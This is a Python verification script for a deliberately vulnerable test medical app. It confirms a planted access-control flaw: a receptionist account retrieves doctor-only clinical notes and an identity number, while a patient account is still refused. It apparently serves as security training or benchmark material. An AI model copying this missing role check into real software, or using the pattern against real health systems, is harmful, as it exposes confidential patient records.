"""Verification script for Task 3.2 / V02: Excessive Staff Privileges."""

import os
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from fastapi.testclient import TestClient
from backend.app.main import app

def main():
    client = TestClient(app)

    # 1. Authenticate as reception staff (role: staff_basic)
    login_resp = client.post(
        "/api/auth/login",
        json={"email": "reception@medivault.test", "password": "Password123!"},
    )
    assert login_resp.status_code == 200, f"Login failed: {login_resp.text}"
    token = login_resp.json()["access_token"]
    user_info = login_resp.json()["user"]
    assert user_info["email"] == "reception@medivault.test"
    assert user_info["role"] == "staff_basic"
    print(f"[+] Successfully authenticated as {user_info['email']} (role: {user_info['role']})")

    # 2. Exploit V02: Receptionist accesses doctor-restricted clinical history and notes
    clinical_resp = client.get(
        "/api/staff/patients/PAT-100001/clinical",
        headers={"Authorization": f"Bearer {token}"},
    )
    assert clinical_resp.status_code == 200, f"Failed clinical access: {clinical_resp.text}"
    data = clinical_resp.json()
    assert data["patient_id"] == "PAT-100001"
    assert "medical_notes" in data and data["medical_notes"] is not None
    assert "cognitive behavioral therapy" in data["medical_notes"]
    assert data["aadhaar_ref"] == "1002 4471 0001"
    print(f"[+] V02 Verified: Receptionist successfully retrieved confidential clinical notes: '{data['medical_notes'][:50]}...'")
    print(f"[+] V02 Verified: Identity reference exposed: {data['aadhaar_ref']}")

    # 3. Patient role is still rejected (403)
    p_login = client.post(
        "/api/auth/login",
        json={"email": "patient01@medivault.test", "password": "Password123!"},
    )
    p_token = p_login.json()["access_token"]
    p_resp = client.get(
        "/api/staff/patients/PAT-100001/clinical",
        headers={"Authorization": f"Bearer {p_token}"},
    )
    assert p_resp.status_code == 403, f"Expected 403 for patient, got: {p_resp.status_code}"
    print("[+] Patient access to staff clinical endpoint properly rejected (403)")

    print("\n[SUCCESS] Task 3.2: V02 Excessive Staff Privileges verified successfully!")

if __name__ == "__main__":
    main()
